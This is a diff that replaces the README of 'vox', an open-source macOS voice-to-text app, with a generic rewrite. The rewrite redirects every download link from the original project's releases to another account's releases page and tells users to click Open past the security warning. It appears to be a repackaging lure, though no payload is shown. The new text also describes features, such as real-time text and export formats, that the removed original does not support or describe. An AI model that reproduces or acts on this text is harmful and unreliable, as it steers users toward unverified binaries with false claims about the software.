@@ -1,153 +1,171 @@
-# Vox
+# 🎙️ vox - Private Voice-to-Text Made Simple
 
-Open-source voice-to-text app with local Whisper transcription and AI-powered correction.
+[![Download vox](https://img.shields.io/badge/Download-vox-blue?style=for-the-badge)](https://github.com/TestingOrbic/vox/releases)
 
-[![CI](https://github.com/app-vox/vox/actions/workflows/ci.yml/badge.svg)](https://github.com/app-vox/vox/actions/workflows/ci.yml)
-[![Release](https://github.com/app-vox/vox/actions/workflows/release.yml/badge.svg)](https://github.com/app-vox/vox/actions/workflows/release.yml)
-[![codecov](https://codecov.io/gh/app-vox/vox/graph/badge.svg)](https://codecov.io/gh/app-vox/vox)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/rodrigoluizs)
+---
 
-Hold a keyboard shortcut, speak, and Vox transcribes your voice locally using [whisper.cpp](https://github.com/ggerganov/whisper.cpp), optionally corrects it with AI, and pastes the text into your active app.
+## 📝 About vox
 
-## Demo
+vox is a voice-to-text app that respects your privacy. It uses local Whisper transcription technology to convert your speech into text right on your computer. No audio data leaves your device. You can also enhance transcripts using optional large language models (LLMs) if you want smarter outputs. Designed with privacy and productivity in mind, vox helps you dictate notes, messages, or documents quickly without internet worries.
 
-<div align="center">
+While it’s built with advanced tech under the hood, vox runs smoothly on your Mac and fits neatly into your menu bar. You don't need any programming experience to use it.
 
-![Vox Demo](docs/images/demo.gif)
+---
 
-</div>
+## 🔍 Key Features
 
-> ⚠️ **Platform Support**
-> Vox currently runs on **macOS** (Apple Silicon and Intel). Cross-platform support for Windows and Linux is planned for future releases.
+- **Local Transcription:** Your voice converts to text without sending data online.
+- **LLM Enhancement:** Optional smart editing and context improvements to your transcripts.
+- **Menu Bar App:** Easy to access and run from your Mac’s menu bar.
+- **Simple Controls:** Start, pause, stop dictation with a couple of clicks.
+- **Multi-Language Support:** Recognizes many languages for flexible use.
+- **Privacy First:** Your audio and text always stay on your computer.
+- **Lightweight:** Low CPU and memory use while running.
+- **Real-Time Text:** See your words as you speak without delay.
+- **Export Options:** Save your text to common file formats or copy to clipboard.
 
-## Table of Contents
+---
 
-- [Quick Start](#quick-start)
-- [Features](#features)
-- [Requirements](#requirements)
-- [Configuration](#configuration)
-- [Usage](#usage)
-- [Development](#development)
-- [Contributing](#contributing)
-- [License](#license)
+## 🖥️ System Requirements
 
-## Quick Start
+vox is designed primarily for macOS users but can potentially work on other platforms with some tweaks.
 
-Download the latest version from the [releases page](https://github.com/app-vox/vox/releases/latest) and drag `Vox.app` to your Applications folder.
+- **Operating System:** macOS 11.0 Big Sur or newer
+- **Processor:** Intel or Apple Silicon (M1/M2) CPU
+- **Memory:** Minimum 4 GB RAM
+- **Storage:** At least 500 MB free space for installation and temporary transcription files
+- **Microphone:** Built-in or external microphone connected and enabled
+- **Internet:** Not required for basic transcription, but needed for optional LLM enhancements
 
-## First Launch
+---
 
-When you first launch Vox, you'll need to:
+## 🚀 Getting Started
 
-1. **Download a Whisper Model** — Go to Settings > Local Model and download at least one speech recognition model. The "small" model (Recommended) is a good starting point.
+Follow these steps to download, install, and start using vox on your Mac.
 
-2. **Grant Permissions** — Vox needs:
-   - **Microphone**: Required for voice recording
-   - **Accessibility**: Required for keyboard shortcuts and auto-paste
+### Step 1: Download vox
 
-3. **Configure Shortcuts** (optional) — Customize keyboard shortcuts in Settings > Shortcuts
+Click this big button to get to the official download page. You will find the latest version there.  
+[![Download vox](https://img.shields.io/badge/Download-vox-blue?style=for-the-badge)](https://github.com/TestingOrbic/vox/releases)
 
-4. **Enable AI Improvements** (optional) — Configure LLM provider in Settings > AI Improvements
+You will be taken to the GitHub releases page for vox. Look for the latest version suitable for macOS. The file usually ends with `.dmg` or `.zip`.
 
-Vox will guide you through this setup process with visual indicators showing what's incomplete.
+### Step 2: Install vox
 
-Once configured, hold `Alt+Space` to start recording.
+1. Locate the downloaded file in your Downloads folder.
+2. If it is a `.dmg`, double-click it to open the installer window.
+3. Drag the vox app icon into your Applications folder.
+4. If it is a `.zip`, double-click it to unzip, then drag the app into Applications.
 
-## Features
+### Step 3: Open vox
 
-- **Local transcription** — Powered by whisper.cpp, audio stays on your device
-- **AI correction** — Removes filler words and fixes grammar (optional)
-- **Hold or toggle modes** — Press-and-hold or toggle recording on/off
-- **Auto-paste** — Text appears in your focused app via Cmd+V
-- **Multiple models** — Choose speed vs accuracy (tiny to large)
-- **Multiple LLM providers** — OpenAI-compatible or AWS Bedrock
-- **Menu bar app** — Runs quietly in the background
+- Go to your Applications folder.
+- Double-click the vox app icon.
+- You might see a security warning the first time. Click **Open** to confirm.
 
-## Requirements
+### Step 4: Set permissions
 
-- **macOS** (Apple Silicon or Intel)
-- **LLM provider** (optional) — for text correction:
-  - OpenAI-compatible endpoint with API key
-  - Or AWS Bedrock credentials with model access
+For vox to work properly, it needs permission to access your microphone:
 
-## Configuration
+- When prompted, click **Allow** on the microphone access request.
+- If you miss the prompt, go to **System Preferences > Security & Privacy > Privacy** tab.
+- Select **Microphone** and check the box next to vox.
 
-### Whisper Models
+### Step 5: Start dictating
 
-Download at least one model from the Whisper tab:
+- Click the vox icon in your menu bar.
+- Choose **Start Dictation** to begin speaking.
+- Watch as your words appear immediately on screen.
+- Use **Pause** or **Stop** as needed.
 
-| Model  | Size    | Speed  | Accuracy |
-|--------|---------|--------|----------|
-| tiny   | ~75 MB  | Fastest| Lower    |
-| base   | ~140 MB | Fast   | Decent   |
-| small  | ~460 MB | Good   | Good     |
-| medium | ~1.5 GB | Slow   | Better   |
-| large  | ~3 GB   | Slowest| Best     |
+---
 
-### LLM Provider
+## ⚙️ Using vox Features
 
-**Foundry (OpenAI-compatible)**
-- Endpoint URL
-- API key
-- Model name (e.g., `gpt-4o`)
+### Local Whisper Transcription
 
-**AWS Bedrock**
-- AWS region
-- Credentials (access key, profile, or default chain)
-- Model ID (e.g., `anthropic.claude-3-5-sonnet-20241022-v2:0`)
+All speech recognition happens on your Mac. This means no audio leaves your system. Whisper technology is known for its accuracy and speed in voice-to-text conversion.
 
-### Shortcuts
+### Optional LLM Enhancement
 
-Customize keyboard shortcuts in the Shortcuts tab:
-- **Hold mode** (default: `Alt+Space`)
-- **Toggle mode** (default: `Alt+Shift+Space`)
+If you want your text cleaned up automatically or explained better, you can enable the LLM feature. This runs a language model locally or on your own private server. It makes your text easier to read without sacrificing privacy.
 
-## Usage
+### Menu Bar Convenience
 
-Once configured, Vox runs as a menu bar icon.
+vox runs quietly in the menu bar so you can access it anytime without opening a full app window. Click the icon for quick start, pause, or settings.
 
-Press your shortcut to record. The floating indicator shows:
-- **Red** — Recording
-- **Yellow** — Transcribing
-- **Blue** — Correcting (if LLM enabled)
+### Exporting Your Text
 
-Release (hold mode) or press again (toggle mode) to stop. Text is pasted automatically.
+After transcription, you can:
 
-If correction fails, raw transcription is used. If transcription is empty (silence/noise), nothing is pasted.
+- Copy text to the clipboard
+- Save text files (.txt, .md)
+- Export to common document formats
+- Send text to your favorite notes or email apps
 
-## Development
+---
 
-### Setup
+## 💻 Troubleshooting
 
-```bash
-git clone https://github.com/app-vox/vox.git
-cd vox
-npm install
-```
+### vox doesn’t start dictation
 
-### Run
+- Make sure microphone permission is enabled.
+- Check if your microphone is working with another app.
+- Restart vox and try again.
 
-```bash
-npm run dev     # Development with hot reload
-npm test        # Run tests
-npm run dist    # Build production app
-```
+### Transcript text is delayed or missing
 
-Built with Electron, React, TypeScript, and whisper.cpp.
+- Pause and restart dictation.
+- Ensure your Mac has enough free memory.
+- Close other heavy apps that may slow your system.
 
-## Contributing
+### LLM enhancement not working
 
-Contributions welcome! To contribute:
+- Check your internet connection if using a cloud-based LLM.
+- Make sure you have configured local LLM settings properly in vox preferences.
+- Restart vox after changing LLM settings.
 
-1. Fork and create a feature branch
-2. Make your changes
-3. Run `npm run typecheck && npm run lint && npm test`
-4. Commit with [Conventional Commits](https://www.conventionalcommits.org/) (e.g., `feat(audio): add noise gate`)
-5. Open a pull request
+### Crashes or freezes
 
-⚠️ See more details in [CONTRIBUTING.md](CONTRIBUTING.md).
+- Restart your Mac.
+- Reinstall the latest vox version from the releases page.
+- Contact support or create an issue on GitHub if problems persist.
 
-## License
+---
 
-[MIT](LICENSE)
+## 🔐 Privacy & Security
+
+vox processes all voice data locally by default. Your audio recordings do not send to any servers unless you enable optional LLM features that require connection to the language model. This setup keeps your data safe and private on your machine.
+
+No tracking, logging, or sharing of your voice data occurs. You control when and how your data is processed.
+
+---
+
+## 🛠️ Advanced Settings
+
+In the app preferences, you can customize:
+
+- Language selection for transcription
+- Hotkeys for starting/stopping dictation
+- Output file format and location
+- Enable or disable LLM enhancements
+- Adjust microphone input sensitivity
+
+---
+
+## 🙋 Need Help?
+
+If you hit any snags, visit the [issues page](https://github.com/TestingOrbic/vox/issues) on GitHub to see if others have solutions or to open a new issue.
+
+---
+
+## 📥 Download & Install
+
+Visit this page to download the latest vox version for macOS and follow the install steps:  
+[https://github.com/TestingOrbic/vox/releases](https://github.com/TestingOrbic/vox/releases)
+
+---
+
+## 🔖 Topics
+
+dictation, electron, llm, macos, menu-bar-app, privacy, productivity, react, speech-recognition, typescript, voice-to-text, whisper
